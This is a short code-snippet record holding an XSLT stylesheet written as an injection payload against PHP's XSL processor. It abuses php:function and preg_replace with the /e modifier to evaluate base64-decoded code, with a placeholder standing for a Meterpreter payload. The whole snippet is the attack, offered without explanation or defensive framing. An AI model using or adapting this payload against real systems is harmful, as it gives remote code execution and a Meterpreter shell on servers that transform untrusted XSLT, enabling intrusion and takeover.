---
id: cc16f77e-e3af-4c04-822c-88431834045a
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:41.543385+00:00'
updated_at: '2023-04-10T20:24:49.324314+00:00'
---

# Code Snippet cc16f77e

**Language**: xml

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:variable name="eval">
                        eval(base64_decode('Base64-encoded Meterpreter code'))
                </xsl:variable>
                <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
        </xsl:template>
</xsl:stylesheet>
```
